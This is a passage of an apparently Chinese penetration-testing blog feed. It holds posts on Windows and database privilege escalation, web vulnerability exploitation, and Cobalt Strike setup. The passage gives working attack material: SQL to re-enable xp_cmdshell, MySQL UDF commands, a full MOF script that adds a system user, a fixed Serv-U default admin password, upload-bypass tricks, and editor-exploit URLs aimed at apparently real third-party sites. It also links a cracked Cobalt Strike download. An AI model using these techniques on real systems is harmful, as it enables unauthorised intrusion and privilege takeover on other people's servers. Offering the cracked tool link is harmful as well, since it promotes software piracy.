<li>Windows Services漏洞提权<br>　　Windows系统服务运行在后端，由操作系统通过SCM(服务控制管理)控制，它负责处理所有发送给windows服务的命令，接收windows服务的更新。如果我们能够修改一个服务的二进制文件路径属性，在重启服务的时候，我们可以让服务以system权限替我们启动一个命令。</li>
<li>Serv-U提权<br>　　Ser-u提权可以利用serv-u ftp本地溢出漏洞进行，具体方法用serv-u工具提权生成serv-u提权工具生成serv_u.exe，将其上传到一个盘符执行提权命令。<br>　　也可以用serv-u管理用户来进行提权，serv-u的默认管理端口是43958，只有本地才能连接这个管理端口。Serv-u默认管理账号为LocalAdministrator,默认密码是“#@$ak#.lk;0@P”，这个密码是固定的，如果网站管理员忘记修改密码，那么获取webshell后就可以连接该端口后执行命令来添加系统用户。如果管理员修改了密码，还可以通过ServUAdmin.exe文件来获取管理账号和密码。现在大马已经集成了Serv-U一键提权<br><img src="http://obh1qcqek.bkt.clouddn.com/17-12-25/18787600.jpg" alt=""><br><img src="http://obh1qcqek.bkt.clouddn.com/17-12-25/61508929.jpg" alt=""></li>
<li>SQL Server提权<br>SA权限使用xp_cmdshell存储过程进行提权<br>1、开启xp_cmdshell<br>xp_cmdshell默认在mssql2000中是开启的，在mssql2005之后的版本中则默认禁止。如果用户拥有管理员sa权限则可以用sp_configure重修开启它。<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">EXEC sp_configure &apos;show advanced options&apos;,1//允许修改高级参数</div><div class="line">RECONFIGURE</div><div class="line">EXEC sp_configure &apos;xp_cmdshell&apos;,1  //打开xp_cmdshell扩展</div><div class="line">RECONFIGURE</div><div class="line">若开启失败，可能管理员删除了组件，可以通过一下命令恢复</div><div class="line">dbcc addextendedproc(&quot;xp_cmdshell&quot;,&quot;xplog70.dll&quot;);</div></pre></td></tr></table></figure>
</li>
</ul>
<p>突破SA的各种困难<br>常见情况恢复执行xp_cmdshell<br>1 未能找到存储过程’master..xpcmdshell’.<br>恢复方法：查询分离器连接后,<br>第一步执行:EXEC sp_addextendedproc xp_cmdshell,@dllname =’xplog70.dll’declare @o int<br>第二步执行:sp_addextendedproc ‘xp_cmdshell’, ‘xpsql70.dll’<br>然后按F5键命令执行完毕<br>2 无法装载 DLL xpsql70.dll 或该DLL所引用的某一 DLL。原因126（找不到指定模块。）<br>恢复方法：查询分离器连接后,<br>第一步执行：sp_dropextendedproc “xp_cmdshell”<br>第二步执行：sp_addextendedproc ‘xp_cmdshell’, ‘xpsql70.dll’<br>然后按F5键命令执行完毕<br>3 无法在库 xpweb70.dll 中找到函数 xp_cmdshell。原因: 127(找不到指定的程序。)<br>恢复方法：查询分离器连接后,<br>第一步执行:exec sp_dropextendedproc ‘xp_cmdshell’<br>第二步执行:exec sp_addextendedproc ‘xp_cmdshell’,’xpweb70.dll’<br>然后按F5键命令执行完毕<br>2、执行命令<br>exec xp_cmdshell ‘whoami’</p>
<p>db_owner提权：在db_owner所在管理的表里，创建一个触发器，等管理员用sa用户执行插入表命令的时候就会触发，达到提权目的。mssql也可以通过差异备份写脚本到自启动目录下。利用xp_regwrite再注册表里直接加个系统帐号或者直接写个webshell，在主机重起的时候就可以拿到webshell或者系统权限。</p>
<p>在xp_cmdshell被删除或者出错情况下，我们可以利用其它通过SQL Server 执行系统命令的方法来达到提权效果。<br><a href="http://www.cnblogs.com/xiao0/archive/2012/08/09/2630048.html" target="_blank" rel="external">sp_oacreate</a><br><a href="https://evi1cg.me/archives/Exec_OS_Command_Via_MSSQL.html" target="_blank" rel="external">SQL Server CLR</a><br>Microsoft SQL Server 现在具备与 Microsoft Windows .NET Framework 的公共语言运行时 (CLR) 组件集成的功能。<br><a href="https://www.anquanke.com/post/id/84646" target="_blank" rel="external">Agent Job</a><br>此种方式适用于服务器开启了MSSQL Agent Job服务，并且服务器中当前运行的用户账号拥有足够的权限去创建并执行代理作业的情况。<br><a href="https://evi1cg.me/archives/Powerup.html" target="_blank" rel="external">PowerUpSQL</a></p>
<ul>
<li>MYSQL提权<br>利用mysql提权的三种方式均需要获取mysql数据库最高权限root的帐号密码</li>
</ul>
<p>UDF提权：<br>UDF为User Defined Function用户自定义函数，也就是支持用户自定义函数的功能。这里的自定义函数要以dll形式写成mysql的插件，提供给mysql来使用。也就是说我们可以通过编写dll文件来实现我们需要的功能，UDF编写可以参考（<a href="https://www.404sec.com/7817.html）。利用UDF提权需要知道root账户的密码，并且需要目标系统是Windows。用Udf.dll提权原理是利用mysql的自定义函数功能，将mysql账号转化为system权限，但前提是要有一个mysql账号。" target="_blank" rel="external">https://www.404sec.com/7817.html）。利用UDF提权需要知道root账户的密码，并且需要目标系统是Windows。用Udf.dll提权原理是利用mysql的自定义函数功能，将mysql账号转化为system权限，但前提是要有一个mysql账号。</a></p>
<p>在MYSQL 4.1以前的版本中，可以将所有的DLL文件里面的任何函数都注册到MYSQL里面以供MYSQL调用。无论这个DLL在什么位置，函数的声明是什么样的。</p>
<p>在MYSQL 4.1及以后的版本中，对UDF函数进行了限制，只有实现了一个特定接口的函数才可以被成功注册到MYSQL中，这样就防止了通过MYSQL非法调用系统的DLL。</p>
<p>在MYSQL5.0以后，对注册的DLL的位置有了限制，创建函数的时候，所对应的DLL不能包含/或者\，简单的理解就是不能是绝对路径。 所以我们将DLL上传到包含在PATH这个环境变量内的目录中来跳过这个限制(运行echo %path%可以查看可写目录，例如：C:\WINDOWS\udf.dll或C:\WINDOWS\system32\udf.dll)，或者放到盘符的根目录下通过c:udf.dll这种形式的写法来跳过限制。</p>
<p>Mysql5.1及以上版本，必须将DLL文件上传到mysql安装目录下的lib\plugin文件夹下才能创建自定义的函数。默认情况下’plugin’文件夹并不存在，可能就是为了防止通过into dumpfile将DLL来写到这个文件夹。可以用命令show variables like ‘%plugin%’查看是否存在plugin文件夹。可以在webshell中手工创建lib、plugin文件夹，也可以像下面这样利用NTFS ADS流来创建文件夹(5.7.14 权限不足，Errcode: 13 - Permission denied。5.5.8可以。哪些版本可以？)：</p>
<p>具体方法是上传udf.dll至C:\ProgramFiles\MYSQL\MYSQL  Server 5.1\lib\plugin\udf.dll目录，如果mysql版本小于5.1则上传至C:\WINDOWS\uff.dll或C:\WINDOWS\system32\udf.dll，之后可以执行SQL：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Creat funtion myCmd returns string soname “uff.dll”;</div><div class="line">Select MyCmd(“Cmd命令”);</div><div class="line">Drop function Mycmd</div><div class="line">即可获取system权限</div></pre></td></tr></table></figure></p>
<p>MOF提权：<br>MOF是windows管理规范存储库的托管对象格式文件。在mysql提权中，可以找一个可以目录上传mof文件，利用其中的脚本提权<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">操作系统版本低于Windows Server 2008;</div><div class="line">mysql 版本低于5.7</div></pre></td></tr></table></figure></p>
<p>关于 mof 提权的原理其实很简单，就是利用了c:/windows/system32/wbem/mof/目录下的 nullevt.mof 文件，每分钟都会在一个特定的时间去执行一次的特性，来写入我们的cmd命令使其被带入执行。</p>
<p>该命令，即是把我们的提权命令导入到 nullevt.mof 。<br>select load_file(“C:/php/APMServ5.2.6/www/htdocs/1.mof”) into dumpfile “c:/windows/system32/wbem/mof/nullevt.mof”<br><img src="http://www.secist.com/wp-content/uploads/2016/08/20160813085602.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">#pragma namespace(“\\\\.\\root\\subscription”)</div><div class="line">instance of __EventFilter as $EventFilter</div><div class="line">&#123;</div><div class="line">EventNamespace = “Root\\Cimv2”;</div><div class="line">Name = “filtP2”;</div><div class="line">Query = “Select * From __InstanceModificationEvent “</div><div class="line">“Where TargetInstance Isa \”Win32_LocalTime\” “</div><div class="line">“And TargetInstance.Second = 5”;</div><div class="line">QueryLanguage = “WQL”;</div><div class="line">&#125;;</div><div class="line">instance of ActiveScriptEventConsumer as $Consumer</div><div class="line">&#123;</div><div class="line">Name = “consPCSV2”;</div><div class="line">ScriptingEngine = “JScript”;</div><div class="line">ScriptText =</div><div class="line">“var WSH = new ActiveXObject(\”WScript.Shell\”)\nWSH.run(\”net.exe user secist 123 /add\”)“;</div><div class="line">&#125;;</div><div class="line">instance of __FilterToConsumerBinding</div><div class="line">&#123;</div><div class="line">Consumer = $Consumer;</div><div class="line">Filter = $EventFilter;</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
<p>为了更高的成功率，我们必须分开两次导入该脚本！第一次为用户添加命令，第二次为用户提权</p>
<p>启动项/组策略:<br>windows 启动项和开关机组策略目录下的脚本会在用户登录、开机、关机是自动运行，利用mysql向这些路径导出脚本即可执行任意命令，mysql5.7开始默认使用secure-file-priv选项，不能随意选择导出路径，所以这种办法需要目标mysql版本低于5.7。</p>
<ul>
<li>Oracle提权<br>DBA权限，利用java访问文件系如果oracle服务是administrator账户启动的，只有一个具有resource和connect权限的数据库账户，就能利用metasploit和smbrelay功能，本地搭建一个服务器来取得系统的访问权限统执行命令：<a href="http://huaidan.org/archives/3154.html" target="_blank" rel="external">案例</a></li>
</ul>
<p><a href="http://www.freebuf.com/articles/system/53987.html" target="_blank" rel="external">http://www.freebuf.com/articles/system/53987.html</a></p>
<ul>
<li><p>探测其他脚本是否支持<br>有PHP脚本执行就可能是system权限，或者看本机有没有tocat用jspshell，权限就有可能是system.</p>
</li>
<li><p>Pcanywhere提权<br>获得webshell后若是能顺利跳转至C:/Document and SettingAll/UsersApplicationData/SymantecpcAnywhere/下，就可以下载CIF文件，然后使用相关工具读出密码。</p>
</li>
<li><p>星外提权<br>首先要能识别主机是否使用了星外虚拟祝你管理系统，可以通过查看网站目录，看其中是否有freehost目录或者星外安装目录，当然可以通过phpinfo识别。<br>识别出安装星外虚拟主机管理系统之后，如果有可读可写的目录或者文件，可以直接上传cmd和星外读IIS，运行IIS.exe -i和IIS.exe -u[FreeHost ID]即可获取得密码</p>
</li>
</ul>
<p>Windows提权指南<br><a href="http://www.fuzzysecurity.com/tutorials/16.html" target="_blank" rel="external">http://www.fuzzysecurity.com/tutorials/16.html</a><br>Windows提权辅助脚本<br><a href="https://github.com/pentestmonkey/windows-privesc-check" target="_blank" rel="external">https://github.com/pentestmonkey/windows-privesc-check</a><br>WindowsExploits<br><a href="https://github.com/abatchy17/WindowsExploits" target="_blank" rel="external">https://github.com/abatchy17/WindowsExploits</a></p>
<p>参考链接：<br><a href="https://www.anquanke.com/post/id/85377" target="_blank" rel="external">渗透测试技术之另类Windows提权</a><br><a href="http://www.freebuf.com/vuls/87463.html" target="_blank" rel="external">Windows提权的几种姿势</a><br><a href="http://www.freebuf.com/articles/web/55577.html" target="_blank" rel="external">技术分享：MSSQL注入xp_cmdshell</a><br><a href="http://www.freebuf.com/column/142307.html" target="_blank" rel="external">详述MSSQL服务在渗透测试中的利用</a><br><a href="http://www.freebuf.com/articles/system/53987.html" target="_blank" rel="external">一个人的武林：内网渗透测试思路（二）</a><br><a href="https://evi1cg.me/archives/SUID_Privilege_Escalation.html" target="_blank" rel="external">SUID Privilege Escalation</a><br><a href="http://bobao.360.cn/learning/detail/2984.html" target="_blank" rel="external">实战Linux下三种不同方式的提权技巧</a><br><a href="http://www.freebuf.com/articles/system/129549.html" target="_blank" rel="external">Linux提权：从入门到放弃</a><br><a href="http://www.4hou.com/system/9436.html" target="_blank" rel="external">利用动态链接共享对象库进行Linux提权</a>    </p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;0x01-信息搜集&quot;&gt;&lt;a href=&quot;#0x01-信息搜集&quot; class=&quot;headerlink&quot; title=&quot;0x01 信息搜集&quot;&gt;&lt;/a&gt;0x01 信息搜集&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Linux&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;LinEnum&lt;br&gt;　　&lt;a href=&quot;https://github.com/rebootuser/LinEnum&quot;&gt;LinEnum&lt;/a&gt;可以列举系统设置并且高度总结的linux本地枚举和权限提升检测脚本。&lt;br&gt;隐私访问：判断当前用户是否能够用空口令使用sudo命令,root用户的家目录能否访问。&lt;br&gt;系统信息：主机名，网络详情，当前IP等等。&lt;br&gt;用户信息：当前用户，列出所有包含uid/gid的用户信息，列出有root权限的用户，检查密码hash是否保存在/etc/passwd。
    
    </summary>
    
      <category term="渗透" scheme="https://zjw.dropsec.xyz/categories/%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="渗透测试" scheme="https://zjw.dropsec.xyz/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试--02漏洞查找与利用</title>
    <link href="https://zjw.dropsec.xyz/%E6%B8%97%E9%80%8F/2017/12/03/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-02%E6%BC%8F%E6%B4%9E%E6%9F%A5%E6%89%BE%E4%B8%8E%E5%88%A9%E7%94%A8.html"/>
    <id>https://zjw.dropsec.xyz/渗透/2017/12/03/渗透测试-02漏洞查找与利用.html</id>
    <published>2017-12-03T15:14:28.000Z</published>
    <updated>2017-12-04T15:43:16.000Z</updated>
    
    <content type="html"><![CDATA[<p>　　经过前期的信息搜集阶段，我们已经基本掌握了目标网站的敏感信息，比如：真实IP、二级域名、服务器、组件指纹等等敏感信息。这么信息对我们进行后期的渗透起到了至关重要的作用。常见的网站搭配：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">asp（aspx）+MSSQL</div><div class="line">asp（aspx）+ACCESS</div><div class="line">php+MYSQL</div><div class="line">jsp+MYSQL</div></pre></td></tr></table></figure></p>
<a id="more"></a>
<ul>
<li>asp（aspx）+MSSQL先考虑注入，一般的注入都有DBowner权限可以直接写shell；如果写不了，或者web与数据库分离，那就猜数据，从后台下手了，后台可以上传或者改配置文件；</li>
<li>asp（aspx）+ACCESS拿shell一般只有3种方法，一是前台上传或者注入进后台上传；二是注入进后台改配置文件；三是注入进后台备份数据库或者暴库后知道是asp或者asa数据库于是直接写一句话；</li>
<li>php+MYSQL一般是注入进后台上传，偶尔运气好些权限够高可以注入select into outfile；然后包含，分本地与远程，远程包含在高版本php是不力挺的，于是想办法本地上传图片文件或者写到log里；然后php程序某某未公开的漏洞，运气好可以直接写shell。</li>
<li>jsp+MYSQL利用数据库拿权限方面基本同php，而且jsp的上传基本很少检查文件后缀，于是只要有注入点与后台，拿shell相当的容易。jsp+ORACLE的站我碰到的不多，碰到的也是猜出用户名与密码从后台下手的。</li>
</ul>
<h3 id="0x01-扫描"><a href="#0x01-扫描" class="headerlink" title="0x01 扫描"></a>0x01 扫描</h3><p>　　在目标防护不是特别严的情况下，我们可以直接使用各种漏扫工具先进行一波漏洞扫描。如：Burp、Awvs、Appscan、Nessus等漏扫工具。对扫描出来的漏洞进一步进行手工验证。这样我们的工作效率可能会进一步提高，针对点也明确。<br>　　在进行目录扫描的时候，说不定可以一下扫出个上传点，直接上传shell，这是十分有可能的，有时候你花很久搞一个站，最后发现有个现成的上传点，而且很容易猜到，不过这种情况发生在asp居多！<br>　　对于目标各类web入口，普通网站后台、其他web入口，首先第一反应就是试试弱口令，第二万能密码，第三爆破，第四注入，登录口查找可以使用google语法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">url:xxxx url:login|admin</div><div class="line">url:xxxx intitle:管理|登录</div><div class="line">url:xxxx intext:管理|登录</div></pre></td></tr></table></figure></p>
<p>　　对于敏感文件的泄露，可能会扫描到一些源码泄露、目录遍历、各类探针文件、备份文件等，这样我们可以直接搜索到数据库用户名密码等敏感信息，或者直接进行代码审计，漏洞任你挖；或者识别出具体的CMS，先查找网上是否具有漏洞利用方法，然后下载对应版本信息进行代码审计。</p>
<h3 id="0x02-SQL注入"><a href="#0x02-SQL注入" class="headerlink" title="0x02 SQL注入"></a>0x02 SQL注入</h3><p>　　　　一般情况下拿到一个网站先找注入，后找上传，两者都没有，那就编辑器（eweb,和fck)，或者旁注，存在注入好的情况下可以直接写shell，或者拿到用户命密码后台拿shell。<br>SQL注入直接拿shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">必须root权限；</div><div class="line">已知网站路径；</div><div class="line">GPC关闭；</div></pre></td></tr></table></figure></p>
<ul>
<li>php+mysql注入<br>　　联合查询注入、堆查询注入、基于时间的盲注、基于布尔的盲注、基于报错注入，一般这五种注入SQLmap基本都可以解决，在平时练习的时候可以手工进行练习，以便理解其中的原理以及基本的流程，在实战中可以使用sqlmap等提高我们的效率，前提是我们对注入的原理要有所了解，可以使用-V 3参数可以查看sqlmap注入时的payload。至于如何绕过WAF等，以后我们慢慢详细说明。</li>
<li>asp（aspx）+ACCESS<br>　　表名没得到注入：社工，对比url网站地址<br>　　列名没得到注入：偏移注入、社工、后台源码中参数名<br>　　偏移注入主要是针对知道表，但是不知道字段的。</li>
<li>asp（aspx）+MSSQL<br>　　MSSQL数据库的用户权限，一般有两种，一种是SA权限，这种权限很大，还有一种是DB_OWNER权限，这个权限赋给用户一些对数据库的修改、删除、新增数据库表，执行部分存储过程的权限。但是涉及到一些系统敏感操作权限不具备。<br>　　实际中我们遇到的最多的还是db_owner权限，我们常用的方法就是读网站目录，然后备份获取shell</li>
</ul>
<h3 id="0x03-文件上传"><a href="#0x03-文件上传" class="headerlink" title="0x03 文件上传"></a>0x03 文件上传</h3><p>　　如果运气好的话，我们可以扫到一直上传页面，这样我们就可以直接上传我们的一句话，例如：FCK编辑器的上传页面等，一些根本不需要进入后台就可以访问的上传页面。<br>　　文件上传的常用方法00截断、Apache、Ngnix、IIS等一些解析漏洞进行上传利用，绕过WAF的一些思路和方法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">WAF身份认证阶段的绕过</div><div class="line">    伪造搜索引擎</div><div class="line">    伪造白名单特殊目录</div><div class="line">    直接攻击源站</div><div class="line">WAF数据包解析阶段的绕过</div><div class="line">    编码绕过</div><div class="line">    修改请求方式绕过</div><div class="line">    复参数绕过</div><div class="line">WAF触发规则的绕过</div><div class="line">    特殊字符替换空格</div><div class="line">    特殊字符拼接</div><div class="line">    注释包含关键字</div></pre></td></tr></table></figure></p>
<ul>
<li>解析漏洞<br>（1）IIS 6.0 （除了解析asp，还解析asa, cer, cdx ）<br>文件名解析：test.jpg ——à a.asp;.test.jpg<br>目录解析：/test.jpg ——à /111.asp/test.jpg （该目录下需能创建文件夹）<br>（2）IIS 7.0/7.5 Ngnix （只能解析php）<br>www.xxx.com/test.jpg ——à www.xxx.com/test.jpg/.php<br>在网站图片位置后面+/.php乱码就存在解析漏洞，然后传图马，+/.php菜刀链接。<br>（3）Apache<br>Apache 是从右到左开始判断解析,如果为不可识别解析,就再往左判断.。<br>www.xxx.com/test.jpg ——à www.xxx.com/xx.php.xxxxxxx</li>
<li>上传漏洞攻击手法<br>（1）%00截断上传<br>（2）文件头修改<br>有的时候审核文件类型并不都是按后缀名，也可能按文件头内容，修改可突破。<br>GIF: gif89a jpg：JFIF<br>（3）文件类型修改</li>
<li>编辑器上传<br>（1）ewebeditor<br>辑器漏洞利用核心：获取编辑器地址</li>
</ul>
<p>1、Ewebeditor编辑器漏洞利用过程：获取编辑器地址，尝试获取编辑器后台地址，尝试默认账号密码登陆，如登陆失败可尝试下载默认数据库，破解其账号密码，登陆后台，尝试添加上传类型，如无确认按钮，可新增样式，新增插入图片，浏览上传，获取后门地址。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">默认后台地址：ewebeditor/admin_login.asp</div><div class="line">默认账号密码：admin admin/admin123/admin888</div><div class="line">默认数据库地址：ewebeditor/db/ewebeditor.mdb</div></pre></td></tr></table></figure></p>
<p>2、目录遍历（选择目录样式）<br><a href="http://www.kirinmach.com/ewebeditor//admin_uploadfile.asp?id=14&amp;dir=../../../" target="_blank" rel="external">http://www.kirinmach.com/ewebeditor//admin_uploadfile.asp?id=14&amp;dir=../../../</a>..<br>3、寻找前人痕迹再次入侵（下载的数据查找样式）<br><a href="http://www.njgyjx.com/ewebeditor/ewebeditor.asp?ID=45&amp;style=standard1" target="_blank" rel="external">http://www.njgyjx.com/ewebeditor/ewebeditor.asp?ID=45&amp;style=standard1</a><br>添加：asp，asa，php，aspx，aaspsp等类型<br>（2）fckeditor<br>首先确定网站脚本格式，然后寻找漏洞地址，访问上传，结合解析漏洞加以利用！<br>qq.asp;.jpg ==》qq.asp;.jpg （过滤：qqq_asp;.jpg）</p>
<p>突破fckeditor “.”过滤”_”：二次上传<br>第一次上传：qq.asp;.jpg ==》qq_asp;.jpg<br>第二次上传：qq.asp;.jpg ==》qq_asp;.jpg (不满足命名要求)，可能出现第二次命名为 qq.asp;(1).jpg（这样就符合解析漏洞格式）<br>新建上传<br>漏洞地址：<br>editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&amp;Type=Image&amp;CurrentFolder=/qing.asp&amp;NewFolderName=x.asp<br>结果：会建两个文件夹 /qing.asp/x_asp<br>手工新建：<br>/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&amp;Type=Image&amp;CurrentFolder=/&amp;NewFolderName=xiaodi.asp<br>结果： /xiaodi<em>asp<br>原因：<br>CurrentFolder：当前文件夹 未进行过滤<br>NewFolderName：新建文件名 进行了过滤（将“.”过滤成“</em>”）</p>
<h3 id="0x04-其他漏洞"><a href="#0x04-其他漏洞" class="headerlink" title="0x04 其他漏洞"></a>0x04 其他漏洞</h3><p>XSS：可以利用XSS盲打后台。得到管理员的COOKLE和后台登录地址，可以直接登录后台拿shell；<br>任意文件下载：通常有下载功能的站我们可以尝试修改下URL文件名，看能否下载站点敏感文件，如数据库配置文件、配置文件等进行代码审计；<br>SSRF：可以利用SSRF得到真实IP，对内网进行扫描甚至攻击；<br>文件包含：可以包含本地的一些敏感信息或者远程包含拿shell；<br>变量覆盖：覆盖原始数据库配置信息（数据库地址，数据库账号密码，管理员账号密码）</p>
<h3 id="0x05-端口、中间件利用"><a href="#0x05-端口、中间件利用" class="headerlink" title="0x05 端口、中间件利用"></a>0x05 端口、中间件利用</h3><p>　　弱口令和everyone权限，比如21对应的FTP、1433对应的MSSQL、3306对应的MYSQL、3389对应的远程桌面、1521对应的Oracle等等，先试试弱口令和字典爆破，或许会有收获呢！<br>　　常见的一些中间件，如weblogic、Tomcat、jboss、JOnAS、WebSphere等一些中间件根据已经爆出的漏洞我们也可以直接拿到shell。</p>
<h3 id="0x06-其他"><a href="#0x06-其他" class="headerlink" title="0x06 其他"></a>0x06 其他</h3><p>爆网站路径：</p>
<ul>
<li>报错显示</li>
<li>漏洞报错</li>
<li>遗留文件：phpinfo</li>
<li>读取配置文件</li>
<li>社工</li>
</ul>
<p>后台拿shell:</p>
<ul>
<li>修改配置文件（模板修改）</li>
<li>数据库备份</li>
<li>抓包上传</li>
<li>执行SQL命令</li>
<li>插入一句话</li>
<li>修改上传类型</li>
</ul>
<p>网站cms识别<br>1、模板cms（开源源码程序）<br>Phpcms，dedecms，aspcms，WordPress，discuz，phpweb，php168等<br>2、非模板cms识别技术：<br>（1）工具识别：<br>Windows：指纹识别工具<br>Linux：whatweb<br>（2）人工识别：<br>图标logo，底部文件，后台标示，网站url地址,robots.txt等<br>介绍特定cms漏洞扫描两款工具：<br>（1）Wpscan：WordPress程序漏洞专用扫描器<br>（2）Joomscan：Joomla程序漏洞专用扫描器</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;　　经过前期的信息搜集阶段，我们已经基本掌握了目标网站的敏感信息，比如：真实IP、二级域名、服务器、组件指纹等等敏感信息。这么信息对我们进行后期的渗透起到了至关重要的作用。常见的网站搭配：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;asp（aspx）+MSSQL&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;asp（aspx）+ACCESS&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;php+MYSQL&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;jsp+MYSQL&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="渗透" scheme="https://zjw.dropsec.xyz/categories/%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="渗透测试" scheme="https://zjw.dropsec.xyz/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>Cobalt Strike学习笔记</title>
    <link href="https://zjw.dropsec.xyz/%E6%B8%97%E9%80%8F/2017/10/27/Cobalt-Strike%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html"/>
    <id>https://zjw.dropsec.xyz/渗透/2017/10/27/Cobalt-Strike学习笔记.html</id>
    <published>2017-10-27T03:45:22.000Z</published>
    <updated>2017-12-24T09:06:08.000Z</updated>
    
    <content type="html"><![CDATA[<p>　　Cobalt Strike 一款以metasploit为基础的GUI的框架式渗透测试工具，集成了端口转发、服务扫描，自动化溢出，多模式端口监听，win exe木马生成，win dll木马生成，java木马生成，office宏病毒生成，木马捆绑；钓鱼攻击包括：站点克隆，目标信息获取，java执行，浏览器自动攻击等等。Cobalt Strike主要用于团队作战，能让多个攻击者同时连接到团体服务器上，共享攻击资源与目标信息和sessions。<br>　　<a href="https://cobaltstrike.com/" target="_blank" rel="external">Cobalt Strike</a>，据说现在最新版为3.9，主要分为试用版和付费版，试用版为21天，付费版3500美元，据说网上也有一些<a href="http://www.cnblogs.com/haq5201314/p/7040832.html" target="_blank" rel="external">破解教程</a>，<a href="https://pan.baidu.com/s/1qYocNbm" target="_blank" rel="external">cobaltstrik3.6破解版下载</a> 密码: 51tg。因为Cobalt Strike是美国对外限制型出口软件，只在美国和加拿大允许发售，所以我们需要google搜索下usa的个人代理来绕开限制。<br><a id="more"></a></p>
<h2 id="0x01-安装与运行"><a href="#0x01-安装与运行" class="headerlink" title="0x01 安装与运行"></a>0x01 安装与运行</h2><p>　　Cobalt Strike需要JAVA环境，需要注意的是JAVA环境不要安装最新版，否则会出一些问题，Cobalt Strike分为客户端和服务端可分布式操作可以协同作战。但一定要架设在外网上，或者自己想要搭建的环境中，服务器端只能运行在Linux系统上。其中关键的文件是teamserver以及cobaltstrike.jar，将这两个文件放到服务器上同一个目录，然后运行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./teamserver 192.168.3.32 test   #自己的IP和密码</div></pre></td></tr></table></figure></p>
<p><img src="http://obh1qcqek.bkt.clouddn.com/17-10-27/38385816.jpg" alt=""><br>　　说一下我安装运行时遇到的坑，首先：JAVA版本必须为8，否则就因版本问题无法编译运行；二：IP必须为真实IP，不能使用0.0.0.0或者127.0.0.1，这样也会报错的。<br>　　服务器端运行之后，我们就可以运行客户端了，客户端可以在Windows或者Linux下都可以。输入我们刚才IP以及端口、密码，用户名可以任意设置。<br><img src="http://obh1qcqek.bkt.clouddn.com/17-10-27/28532677.jpg" alt=""><br><img src="http://obh1qcqek.bkt.clouddn.com/17-10-27/47388596.jpg" alt=""><br>　　当攻击目标在控制台所操作的指令都会被记录到保留在Cobalt Strike目录logs下，对了，破解版是无法更新的。</p>
<h2 id="0x02-参数详情"><a href="#0x02-参数详情" class="headerlink" title="0x02 参数详情"></a>0x02 参数详情</h2><ul>
<li><p>Cobalt Strike</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">New Connection  #进行另外一个连接，支持连接多个服务器端</div><div class="line">Preferences  #设置Cobal Strike界面、控制台、以及输出报告样式、TeamServer连接记录</div><div class="line">Visualization  #主要展示输出结果的形式</div><div class="line">VPN Interfaces  #设置VPN接口</div><div class="line">Listenrs  #创建一个Listener</div><div class="line">Script Manager  #</div><div class="line">Close  #退出连接</div></pre></td></tr></table></figure>
</li>
<li><p>View</p>
